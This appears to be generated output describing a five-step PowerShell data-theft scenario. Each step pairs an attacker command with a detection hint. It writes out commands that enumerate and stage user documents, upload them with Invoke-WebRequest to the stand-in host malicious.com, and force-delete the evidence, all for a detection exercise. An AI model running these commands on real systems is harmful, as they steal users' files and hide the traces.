<output>
1. **Data Discovery**
   - Application: PowerShell
   - User Action: An attacker executes a PowerShell command to enumerate files of interest.
   - Key Artifacts: Command executed: `Get-ChildItem -Path C:\Users\User\Documents -Include *.docx, *.pdf, *.xls -Recurse`
   - Detection: Monitor for PowerShell commands that enumerate files with specific extensions in user directories.

</output>
<output>
2. **Data Collection**
   - Application: PowerShell
   - User Action: The attacker runs a script to collect sensitive files and stage them for exfiltration.
   - Key Artifacts: Script executed: `foreach ($file in Get-ChildItem -Path C:\Users\User\Documents -Include *.docx, *.pdf, *.xls -Recurse) { Copy-Item $file.FullName C:\Temp\StagedFiles\ }`
   - Detection: Monitor for unusual file copy operations to temporary directories, especially from user document folders.

</output>
<output>
3. **File Staging**
   - Application: Windows Explorer
   - User Action: The attacker uses Windows Explorer to verify the staged files before exfiltration.
   - Key Artifacts: Files located in `C:\Temp\StagedFiles\` with timestamps indicating recent access.
   - Detection: Monitor for file access patterns in temporary directories that are not typical for user behavior.

</output>
<output>
4. **Data Exfiltration via C2**
   - Application: PowerShell
   - User Action: The attacker executes a command to upload the staged files to a C2 server.
   - Key Artifacts: Command executed: `Invoke-WebRequest -Uri http://malicious.com/upload -Method POST -InFile C:\Temp\StagedFiles\*`
   - Detection: Monitor for PowerShell commands that initiate HTTP POST requests to known malicious domains, especially those involving file uploads.

</output>
<output>
5. **Anti-Analysis Techniques**
   - Application: PowerShell
   - User Action: The attacker runs a command to delete the staged files after exfiltration to cover tracks.
   - Key Artifacts: Command executed: `Remove-Item -Path C:\Temp\StagedFiles\* -Force`
   - Detection: Monitor for PowerShell commands that delete files from temporary directories, especially after suspicious upload activities.

</output>